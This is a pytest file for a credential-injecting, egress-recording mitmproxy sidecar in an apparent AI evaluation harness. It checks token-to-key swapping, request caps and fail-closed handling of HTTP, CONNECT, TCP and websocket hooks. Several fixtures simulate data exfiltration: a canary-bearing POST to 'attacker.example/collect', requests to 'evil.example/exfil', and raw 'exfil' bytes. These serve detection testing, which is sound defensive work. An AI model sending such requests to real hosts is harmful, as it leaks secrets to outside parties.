"""WP-13 (increment 2b-ii): what runs inside the recording-proxy sidecar (§10.5).

The sidecar rebuilds the run's ``ProxyAddon`` from a config file and its environment. The
security-critical property tested here is *reconstruction fidelity*: a broker rebuilt inside the
sidecar from the exported scoped tokens plus the real keys in env recognises the exact token the
container was given and swaps in the matching real key — if that mapping did not survive the
round trip, injection would silently fail and every model call would go out bearing a worthless
token. All offline: config round-trips, the addon is rebuilt and driven against a fake request,
and a block reduces to a pure triple. The live mitmdump standup is the next slice, on CI.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path

import pytest

from bellwether.capture import (
    CredentialBroker,
    SidecarConfig,
    block_response_args,
    build_addon,
    mint_canaries,
)
from bellwether.capture.proxy_addon import BlockResponse, read_flow_records
from bellwether.capture.sidecar_entry import CONFIG_ENV_VAR, load_addon_from_env
from bellwether.determinism import SeededRng

_REAL_KEY = "sk-real-ANTHROPIC-secret-value"
_HOST_ENVIRON = {"ANTHROPIC_API_KEY": _REAL_KEY}
_TS = "2026-08-06T00:00:00+00:00"


@dataclass
class _FakeRequest:
    """See ``tests/test_proxy_addon._FakeRequest``: ``host`` is where the connection goes,
    ``host_header`` what the client asserted, and they are separate because a spoof is exactly
    the two disagreeing."""

    method: str = "POST"
    scheme: str = "https"
    host: str = "api.anthropic.com"
    host_header: str | None = None
    port: int = 443
    path: str = "/v1/messages"
    headers: dict[str, str] = field(default_factory=dict)
    content: bytes | None = b""

    def __post_init__(self) -> None:
        if self.host_header is None:
            self.host_header = self.host


@dataclass
class _FakeFlow:
    request: _FakeRequest
    response: object | None = None


def _host_broker() -> CredentialBroker:
    return CredentialBroker.for_run(
        {"anthropic": "ANTHROPIC_API_KEY"}, _HOST_ENVIRON, rng=SeededRng(1, "cred")
    )


def _config(broker: CredentialBroker, flow_log: str) -> SidecarConfig:
    return SidecarConfig(
        provider_endpoints=("api.anthropic.com",),
        infrastructure_endpoints=("telemetry.example-harness.com",),
        allowlist_extra=(),
        provider_of_host={"api.anthropic.com": "anthropic"},
        credential_export=broker.sidecar_export(),
        max_requests=100,
        max_request_bytes=1_000_000,
        flow_log_path=flow_log,
    )


# ---------------------------------------------------------------------------
# The broker's sidecar halves
# ---------------------------------------------------------------------------


def test_the_export_carries_the_token_but_never_the_real_key() -> None:
    export = _host_broker().sidecar_export()
    assert export["anthropic"]["sandbox_token"].startswith("bw-sbx-")
    assert export["anthropic"]["api_key_env"] == "ANTHROPIC_API_KEY"
    # The real key must not be anywhere in the non-secret export.
    assert _REAL_KEY not in str(export)


def test_the_real_key_env_is_the_only_place_the_key_travels() -> None:
    env = _host_broker().sidecar_real_key_env()
    assert env == {"ANTHROPIC_API_KEY": _REAL_KEY}


def test_for_sidecar_rebuilds_the_exact_token_to_key_mapping() -> None:
    """Reconstruction fidelity: the sidecar broker, built from the export plus the real key in
    env, must inject the real key for the *same* scoped token the host minted."""
    host = _host_broker()
    token = host.sandbox_token("anthropic")
    rebuilt = CredentialBroker.for_sidecar(host.sidecar_export(), _HOST_ENVIRON)

    injected = rebuilt.inject("anthropic", {"Authorization": f"Bearer {token}"})
    assert injected["Authorization"] == f"Bearer {_REAL_KEY}"


def test_for_sidecar_skips_a_provider_whose_key_is_absent_from_env() -> None:
    """Mirrors ``for_run``: a provider with no real key in env is not ``ready`` and is dropped,
    rather than reconstructed with an empty key (which injection would use to strip the token to
    a bare scheme). The host never sends such a provider a key, so it must not be injectable here."""
    rebuilt = CredentialBroker.for_sidecar(_host_broker().sidecar_export(), {})  # no real key
    assert rebuilt.ready_providers() == []


# ---------------------------------------------------------------------------
# SidecarConfig serialisation
# ---------------------------------------------------------------------------


def test_the_config_round_trips_through_json() -> None:
    config = _config(_host_broker(), "/shared/flows.jsonl")
    assert SidecarConfig.from_json(config.to_json()) == config


def test_the_config_json_is_canonical_and_stable() -> None:
    config = _config(_host_broker(), "/shared/flows.jsonl")
    assert config.to_json() == config.to_json()


def test_the_config_round_trips_canary_markers() -> None:
    """The host writes the run's ``(id, marker)`` pairs into the config on the shared volume; the
    sidecar reads them back to scan bodies (§10.5.2). They round-trip byte-stably like the rest."""
    canaries = mint_canaries(7)
    base = _config(_host_broker(), "/shared/flows.jsonl")
    config = SidecarConfig(
        provider_endpoints=base.provider_endpoints,
        infrastructure_endpoints=base.infrastructure_endpoints,
        allowlist_extra=base.allowlist_extra,
        provider_of_host=base.provider_of_host,
        credential_export=base.credential_export,
        max_requests=base.max_requests,
        max_request_bytes=base.max_request_bytes,
        flow_log_path=base.flow_log_path,
        canary_markers=tuple((c.id, c.marker) for c in canaries),
    )
    assert SidecarConfig.from_json(config.to_json()) == config


def test_build_addon_scans_a_body_for_the_configs_canaries() -> None:
    """The sidecar rebuilds the canaries from its config and scans each body — the end of the wire
    that catches POST-body exfil to a non-model host (§10.5.2)."""
    canaries = mint_canaries(7)
    host = _host_broker()
    config = SidecarConfig(
        provider_endpoints=("api.anthropic.com",),
        infrastructure_endpoints=("telemetry.example-harness.com",),
        allowlist_extra=("attacker.example",),
        provider_of_host={"api.anthropic.com": "anthropic"},
        credential_export=host.sidecar_export(),
        max_requests=100,
        max_request_bytes=1_000_000,
        flow_log_path="/shared/flows.jsonl",
        canary_markers=tuple((c.id, c.marker) for c in canaries),
    )
    addon = build_addon(config, _HOST_ENVIRON, clock=lambda: _TS)
    addon.on_request(
        _FakeRequest(
            host="attacker.example",
            path="/collect",
            content=f"exfil={canaries[0].marker}".encode(),
        )
    )
    hits = addon.flows()[0].canary_hits
    assert [h.canary_id for h in hits] == [canaries[0].id]
    assert hits[0].destination == "other_host"


# ---------------------------------------------------------------------------
# The rebuilt addon actually injects, using the reconstructed broker
# ---------------------------------------------------------------------------


def test_build_addon_injects_the_real_key_for_the_containers_token() -> None:
    host = _host_broker()
    token = host.sandbox_token("anthropic")
    addon = build_addon(_config(host, "/shared/flows.jsonl"), _HOST_ENVIRON, clock=lambda: _TS)

    request = _FakeRequest(headers={"Authorization": f"Bearer {token}"})
    block = addon.on_request(request)

    assert block is None
    assert request.headers["Authorization"] == f"Bearer {_REAL_KEY}"
    # And the recorded flow still holds neither the real key nor the token.
    record = addon.flows()[0]
    assert _REAL_KEY not in str(dict(record.request_headers))
    assert token not in str(dict(record.request_headers))


def test_build_addon_enforces_caps_from_config() -> None:
    host = _host_broker()
    config = SidecarConfig(
        provider_endpoints=("api.anthropic.com",),
        infrastructure_endpoints=(),
        allowlist_extra=(),
        provider_of_host={"api.anthropic.com": "anthropic"},
        credential_export=host.sidecar_export(),
        max_requests=1,
        max_request_bytes=1_000_000,
        flow_log_path="/shared/flows.jsonl",
    )
    addon = build_addon(config, _HOST_ENVIRON, clock=lambda: _TS)
    assert addon.on_request(_FakeRequest()) is None  # first forwards
    blocked = addon.on_request(_FakeRequest())
    assert blocked is not None and blocked.cap_exceeded == "max_requests"


# ---------------------------------------------------------------------------
# block_response_args — the one mitmproxy-shaped edge, made pure
# ---------------------------------------------------------------------------


def test_block_response_args_is_a_plain_status_body_headers_triple() -> None:
    status, body, headers = block_response_args(
        BlockResponse(status=403, reason="nope", cap_exceeded=None)
    )
    assert status == 403
    assert body == b"nope"
    assert headers["content-type"].startswith("text/plain")


# ---------------------------------------------------------------------------
# load_addon_from_env — the mitmdump entry, and its refusal to run unconfigured
# ---------------------------------------------------------------------------


def test_loading_without_a_config_env_var_refuses_to_run() -> None:
    """A sidecar that cannot find its config must fail to start, not run as an open, unrecording
    proxy — an open proxy would forward everything and record nothing."""
    with pytest.raises(RuntimeError, match=CONFIG_ENV_VAR):
        load_addon_from_env({})


def test_the_entry_writes_an_empty_log_immediately_then_records_a_flow(tmp_path: Path) -> None:
    """'The proxy ran' must be true from t=0: the log exists before the first request, so its
    absence unambiguously means the proxy never started. Then a forwarded request lands in it."""
    host = _host_broker()
    flow_log = tmp_path / "flows.jsonl"
    config_path = tmp_path / "config.json"
    config_path.write_text(_config(host, str(flow_log)).to_json(), encoding="utf-8")
    env = {CONFIG_ENV_VAR: str(config_path), "ANTHROPIC_API_KEY": _REAL_KEY}

    addon = load_addon_from_env(env)
    assert read_flow_records(flow_log) == []  # written empty at construction

    token = host.sandbox_token("anthropic")
    addon.request(_FakeFlow(_FakeRequest(headers={"Authorization": f"Bearer {token}"})))

    flows = read_flow_records(flow_log)
    assert len(flows) == 1
    assert not flows[0].blocked
    # The persisted log never carries a credential.
    assert not host.leaks_a_real_key(flow_log.read_text(encoding="utf-8"))
    assert token not in flow_log.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Every relaying hook fails closed (§10.5.0)
#
# mitmproxy catches an addon's exception and *carries on with the flow*, and it relays traffic the
# ``request`` hook never sees: a CONNECT tunnel is answered before any request inside it, and a
# tunnel carrying bytes that are neither TLS nor HTTP is relayed as raw TCP. Both were reproduced
# against the pinned mitmproxy 12.2.3 — a canary-bearing payload reached a host outside the
# allowlist with nothing in the flow log. The fakes below can express each of those, which the
# single-request fake above could not.
# ---------------------------------------------------------------------------


class _UndecodableRequest(_FakeRequest):
    """A request whose body mitmproxy cannot decode — ``Content-Encoding: gzip`` on bytes that
    are not gzip makes the real ``Request.content`` raise ``ValueError``."""

    @property  # type: ignore[override]
    def content(self) -> bytes:
        raise ValueError("Invalid Content-Encoding: gzip, <body bytes that must not be recorded>")

    @content.setter
    def content(self, value: bytes | None) -> None:
        pass


@dataclass
class _Message:
    content: bytes


@dataclass
class _ServerConn:
    address: tuple[str, int] | None


@dataclass
class _HookFlow:
    """The subset of a mitmproxy ``HTTPFlow``/``TCPFlow`` the hooks touch: the request (HTTP),
    the server address and messages (TCP), and the response/kill a refusal is applied through."""

    request: _FakeRequest | None = None
    server_conn: _ServerConn | None = None
    messages: list[_Message] = field(default_factory=list)
    response: object | None = None
    killed: bool = False
    killable: bool = True

    def kill(self) -> None:
        self.killed = True


def _recording(tmp_path: Path, **render: object) -> tuple[object, Path]:
    from bellwether.capture.sidecar_entry import _RecordingAddon

    host = _host_broker()
    flow_log = tmp_path / "flows.jsonl"
    addon = build_addon(_config(host, str(flow_log)), _HOST_ENVIRON, clock=lambda: _TS)
    renderer = render.get("render", lambda block: ("rendered", block.status, block.reason))
    return _RecordingAddon(addon, str(flow_log), render=renderer), flow_log  # type: ignore[arg-type]


def test_a_request_hook_that_raises_refuses_and_records_instead_of_forwarding(
    tmp_path: Path,
) -> None:
    recording, flow_log = _recording(tmp_path)
    flow = _HookFlow(request=_UndecodableRequest(host="evil.example", path="/exfil"))

    recording.request(flow)  # type: ignore[attr-defined]

    assert flow.response is not None and flow.response[1] == 502  # type: ignore[index]
    [record] = read_flow_records(flow_log)
    assert record.blocked
    assert record.host == "evil.example"
    assert "request hook failed (ValueError)" in record.block_reason
    # The exception's message can carry request content; only its type reaches the record.
    assert "must not be recorded" not in flow_log.read_text(encoding="utf-8")


def test_a_connect_to_a_host_outside_the_allowlist_is_refused_before_it_is_dialled(
    tmp_path: Path,
) -> None:
    recording, flow_log = _recording(tmp_path)
    flow = _HookFlow(request=_FakeRequest(method="CONNECT", host="evil.example", port=9555))

    recording.http_connect(flow)  # type: ignore[attr-defined]

    assert flow.response is not None and flow.response[1] == 403  # type: ignore[index]
    [record] = read_flow_records(flow_log)
    assert (record.method, record.host, record.port, record.blocked) == (
        "CONNECT",
        "evil.example",
        9555,
        True,
    )


def test_a_connect_to_an_allowlisted_host_opens_and_records_nothing_itself(
    tmp_path: Path,
) -> None:
    """The requests inside a permitted tunnel are each decided and recorded; recording the tunnel
    as well would count the same egress twice."""
    recording, flow_log = _recording(tmp_path)
    flow = _HookFlow(request=_FakeRequest(method="CONNECT", host="api.anthropic.com"))

    recording.http_connect(flow)  # type: ignore[attr-defined]

    assert flow.response is None
    assert read_flow_records(flow_log) == []


def test_a_connect_that_names_one_host_and_dials_another_is_refused(tmp_path: Path) -> None:
    recording, flow_log = _recording(tmp_path)
    flow = _HookFlow(
        request=_FakeRequest(method="CONNECT", host="evil.example", host_header="api.anthropic.com")
    )

    recording.http_connect(flow)  # type: ignore[attr-defined]

    assert flow.response is not None
    [record] = read_flow_records(flow_log)
    assert record.blocked and record.claimed_host == "api.anthropic.com"


def test_a_connect_hook_that_raises_refuses_the_tunnel(tmp_path: Path) -> None:
    recording, flow_log = _recording(tmp_path)
    flow = _HookFlow(request=None)  # no request to read: the hook itself fails

    recording.http_connect(flow)  # type: ignore[attr-defined]

    assert flow.response is not None and flow.response[1] == 502  # type: ignore[index]
    assert read_flow_records(flow_log)[0].blocked


def test_raw_tcp_is_refused_even_to_an_allowlisted_host_and_no_byte_is_relayed(
    tmp_path: Path,
) -> None:
    """A raw stream carries nothing the proxy can decide, redact or scan, so its destination does
    not matter. mitmproxy relays a message's content *after* ``tcp_message`` returns and a kill
    does not stop a TCP relay, so the payload itself is emptied."""
    recording, flow_log = _recording(tmp_path)
    flow = _HookFlow(server_conn=_ServerConn(("api.anthropic.com", 443)))

    recording.tcp_start(flow)  # type: ignore[attr-defined]
    flow.messages.append(_Message(b"\x00\x01exfil"))
    recording.tcp_message(flow)  # type: ignore[attr-defined]

    assert flow.killed
    assert flow.messages[-1].content == b""
    [record] = read_flow_records(flow_log)
    assert (record.method, record.scheme, record.host, record.blocked) == (
        "TCP",
        "tcp",
        "api.anthropic.com",
        True,
    )


def test_a_forwarded_request_the_log_cannot_record_is_refused(tmp_path: Path) -> None:
    """The decision is persisted *before* the request is let through: a request that would go out
    with no record is refused, the same rule the resolver applies to a query it cannot log."""
    recording, flow_log = _recording(tmp_path)
    flow_log.unlink()
    flow_log.mkdir()  # the log path is now unwritable as a file
    token = _host_broker().sandbox_token("anthropic")
    flow = _HookFlow(request=_FakeRequest(headers={"Authorization": f"Bearer {token}"}))

    recording.request(flow)  # type: ignore[attr-defined]

    assert flow.response is not None and flow.response[1] == 502  # type: ignore[index]


def test_a_refusal_that_cannot_be_rendered_kills_the_flow(tmp_path: Path) -> None:
    def broken(_block: BlockResponse) -> object:
        raise RuntimeError("mitmproxy unavailable")

    recording, _ = _recording(tmp_path, render=broken)
    flow = _HookFlow(request=_FakeRequest(host="evil.example"))

    recording.request(flow)  # type: ignore[attr-defined]

    assert flow.response is None and flow.killed


#: Every event hook mitmproxy 12.2.3 defines (``mitmproxy.hooks.all_hooks``, the pinned version).
#: The CI container test ``test_the_vendored_hook_list_matches_the_pinned_mitmproxy`` compares this
#: against the sidecar image's real mitmproxy, so a version bump that adds a hook fails the build.
MITMPROXY_HOOKS = frozenset({
    "add_log", "client_connected", "client_disconnected", "configure", "dns_error",
    "dns_request", "dns_response", "done", "error", "http_connect", "http_connect_error",
    "http_connect_upstream", "http_connected", "load", "next_layer", "quic_start_client",
    "quic_start_server", "request", "requestheaders", "response", "responseheaders", "running",
    "server_connect", "server_connect_error", "server_connected", "server_disconnected",
    "socks5_auth", "tcp_end", "tcp_error", "tcp_message", "tcp_start", "tls_clienthello",
    "tls_established_client", "tls_established_server", "tls_failed_client",
    "tls_failed_server", "tls_start_client", "tls_start_server", "udp_end", "udp_error",
    "udp_message", "udp_start", "update", "websocket_end", "websocket_message",
    "websocket_start",
})  # fmt: skip

#: The hooks through which a regular-mode proxy relays client traffic to a destination. Each must
#: be implemented, or traffic reaching it is relayed undecided. ``websocket_message`` was missing
#: from the hand-written list this replaced — which is how frames after an upgrade were relayed
#: unscanned and uncapped while this test passed.
_RELAYING_HOOKS = frozenset(
    {"http_connect", "request", "tcp_start", "tcp_message", "websocket_message"}
)

#: Every other hook, with why it relays no client data a decision is owed for.
_NOT_RELAYING: dict[str, str] = {
    **dict.fromkeys(
        ("load", "configure", "running", "done", "update", "add_log"), "addon lifecycle"
    ),
    **dict.fromkeys(
        (
            "client_connected",
            "client_disconnected",
            "server_connect",
            "server_connected",
            "server_disconnected",
            "server_connect_error",
            "next_layer",
        ),
        "connection bookkeeping; the data on the connection reaches a relaying hook",
    ),
    **dict.fromkeys(
        (
            "tls_clienthello",
            "tls_start_client",
            "tls_start_server",
            "tls_established_client",
            "tls_established_server",
            "tls_failed_client",
            "tls_failed_server",
        ),
        "the TLS handshake; the application data inside reaches a relaying hook",
    ),
    "requestheaders": "the body is not streamed (stream_large_bodies is pinned off), so the "
    "request hook sees every request before it is sent",
    "response": "server-to-client; not the sandbox's egress",
    "responseheaders": "server-to-client; not the sandbox's egress",
    "error": "reports a failed flow; nothing is relayed",
    "http_connected": "after http_connect decided the tunnel",
    "http_connect_error": "a tunnel that failed to open",
    "http_connect_upstream": "upstream-proxy mode only; the sidecar runs regular mode",
    "socks5_auth": "SOCKS mode only; the sidecar runs regular mode",
    "tcp_end": "end of a stream tcp_start already refused",
    "tcp_error": "error on a stream tcp_start already refused",
    "websocket_start": "the upgrade was decided by the request hook; no frame yet",
    "websocket_end": "the socket closed; no frame",
    **dict.fromkeys(
        (
            "udp_start",
            "udp_message",
            "udp_end",
            "udp_error",
            "dns_request",
            "dns_response",
            "dns_error",
            "quic_start_client",
            "quic_start_server",
        ),
        "regular (HTTP proxy) mode accepts TCP only; the sandbox reaches DNS through the "
        "controlled resolver, not this proxy",
    ),
}


def test_every_mitmproxy_hook_is_classified_exactly_once() -> None:
    """Fix the class, not the instance: a hand-written list of relaying hooks is only as good as
    the memory of whoever wrote it. Every hook the pinned mitmproxy defines is classified here."""
    assert _RELAYING_HOOKS.isdisjoint(_NOT_RELAYING)
    assert set(_RELAYING_HOOKS) | set(_NOT_RELAYING) == MITMPROXY_HOOKS


def test_every_relaying_mitmproxy_hook_is_implemented() -> None:
    from bellwether.capture.sidecar_entry import _RecordingAddon

    missing = [
        hook for hook in _RELAYING_HOOKS if not callable(getattr(_RecordingAddon, hook, None))
    ]
    assert not missing, (
        f"_RecordingAddon does not gate {missing}; that traffic is relayed undecided"
    )
